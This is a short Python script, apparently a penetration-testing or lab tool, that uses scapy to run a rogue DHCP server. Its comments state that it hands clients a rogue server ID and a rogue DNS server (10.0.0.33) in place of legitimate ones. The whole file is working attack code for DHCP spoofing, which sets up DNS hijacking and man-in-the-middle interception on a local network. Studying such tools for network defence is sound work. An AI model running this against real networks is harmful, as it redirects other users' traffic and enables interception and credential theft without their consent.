from scapy.all import *
from scapy.base_classes import Net


DHCP_SERVER_IP = "10.0.0.33"
DNS_SERVER_IP = "10.0.0.33"

#Changing dhcp options by updating DHCP_am class from scapy module
class DHCP_am(DHCP_am):
    function_name = "dhcpd"

    def make_reply(self, req):
        resp = BOOTP_am.make_reply(self, req)
        if DHCP in req:
            dhcp_options = [(op[0], {1: 2, 3: 5}.get(op[1], op[1]))
                            for op in req[DHCP].options
                            if isinstance(op, tuple) and op[0] == "message-type"]  # noqa: E501
            dhcp_options += [("server_id", DHCP_SERVER_IP), #updated server_id to the rogue dhcp server ip instead of the gateway
                             ("router", self.gw),
                             ("name_server", DNS_SERVER_IP), #updated name_server to the rogue dns server ip instead of an actual dns server
                             ("broadcast_address", self.broadcast),
                             ("subnet_mask", self.netmask),
                             ("renewal_time", self.renewal_time),
                             ("lease_time", self.lease_time),
                             "end"
                             ]
            resp /= DHCP(options=dhcp_options)
        return resp

def main():
    #Retrieve settings from user
    interface = input("Enter interface to listen on: ").strip()
    dhcp_pool = input("Enter dhcp pool (network ip/subnet mask, e.g. 10.0.0.0/24): ").strip()
    curr_network = input("Enter current network (network ip/subnet mask, e.g. 10.0.0.0/24): ").strip()
    gateway = input("Enter default gateway: ").strip()
    renew_time = int(input("Enter renewal time: ").strip())
    lend_time = int(input("Enter lease time: ").strip())
    
    
    #Starting DHCP server
    dhcp_server = DHCP_am(iface=interface, pool=Net(dhcp_pool), network=curr_network, gw=gateway,renewal_time=renew_time, lease_time=lend_time)
    print("Starting DHCP server.")
    dhcp_server()


if __name__ == "__main__":
    main()
